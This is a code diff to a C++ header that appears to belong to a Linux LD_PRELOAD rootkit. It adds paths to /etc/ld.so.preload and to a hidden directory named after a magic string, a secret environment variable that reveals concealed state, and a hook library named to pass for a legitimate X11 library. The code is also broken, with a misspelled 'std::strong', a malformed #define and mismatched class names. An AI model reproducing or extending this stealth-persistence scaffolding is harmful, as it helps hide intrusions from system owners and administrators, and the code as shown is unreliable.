@@ -6,6 +6,7 @@
 // Headers
 //
 #include <string>
+#include <memory>
 
 #include <cstdio>
 #include <cerrno>
@@ -30,6 +31,14 @@
 	#define MAGIC_STRING "0x1234DEADBEAF4321"
 #endif
 const char *prelFileName = "/etc/ld.so.preload";
+const char *prelFileNameClear = "ld.so.preload";
+const char *envShowName = "REAL_STATE_OF_THINGS";
+const char *envShowValue = MAGIC_STRING;
+#define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + dynCnfFileClear);
+const char *dynCnfFileClear = "dynamic_cnf.txt";
+char created = '1', not_created = '0', writed = '1', not_writed = '0';
+const char *hookLibraryNameClear = "libXextecDynamic.so.6";
+#define hookLibraryName = ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + hookLibraryNameClear);
 
 //
 // Prototypes and POD types
@@ -59,10 +68,23 @@ public:
 	int get () const {return m_errno;}
 };
 
+
 typedef struct _DESCR_AND_FLAGS {
 	int m_desc;
+	
 } DESCR_AND_FLAGS, *PDESCR_AND_FLAGS;
 
+
+class DescrDeleter {
+public:
+	void operator () (int *p) {
+		if (*p >= 0) close (*p);
+		delete p;
+	}
+};
+
+
+typedef std::unique_ptr <int, DescDeleter> descr_holder;
 
 
 #endif // MAIN_HEADER_HPP
